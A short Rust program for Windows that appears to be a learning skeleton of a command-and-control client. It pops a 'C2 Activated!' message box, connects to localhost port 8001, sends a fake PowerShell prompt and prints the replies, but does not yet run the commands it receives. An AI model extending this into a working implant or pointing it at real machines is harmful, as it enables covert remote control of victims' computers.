use std::{io::{Write, BufWriter, BufReader, BufRead}, net};
use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE};
use windows::core::PCSTR;
use windows::Win32::Foundation::HWND;

const CONNECT_ADDRESS: &str = "127.0.0.1:8001";

///
/// Displays a Windows MessageBox at launch
/// 
fn show_messagebox(msg: &str) {
    unsafe {
        MessageBoxA(
            HWND(0),
            PCSTR(msg.as_ptr()), 
            PCSTR("Hello!\x00".as_ptr()), 
            MESSAGEBOX_STYLE(0)
        );
    }
}

fn main() {
    show_messagebox("C2 Activated!\x00");

    // The primary TCP socket connection
    let connection =
        net::TcpStream::connect(CONNECT_ADDRESS).expect("Couldn't establish TCP connection");

    // We have to clone the stream for the writer, because this constructor
    // _moves_ the stream out of scope    
    let mut tx = BufWriter::new(connection.try_clone().unwrap());

    // We can use the original stream for this, because we no longer care about the move
    let mut rx = BufReader::new(connection);

    // Kickoff the conversation with the prompt
    tx.write("\nPS $> ".as_bytes()).unwrap();
    tx.flush().unwrap();

    // Initialize an empty String to hold our received data
    let mut read_buf = String::new();

    loop {
        // Clear the buffer from the last go-round
        read_buf.clear();

        // Send our prompt
        tx.write("\nPS $> ".as_bytes()).unwrap();

        // Handle what we get back
        match rx.read_line(&mut read_buf) {
            Ok(bytes_written) => {
                if bytes_written > 0 {
                    let msg = read_buf.trim();
                    println!("{msg}");

                } else {
                    println!("Connection closed."); 
                    break;
                }
            },
            Err(_) => { println!("Connection closed."); break; }
        }
        // This ensure the  BufWriter data has been sent
        tx.flush().unwrap();
    }

}
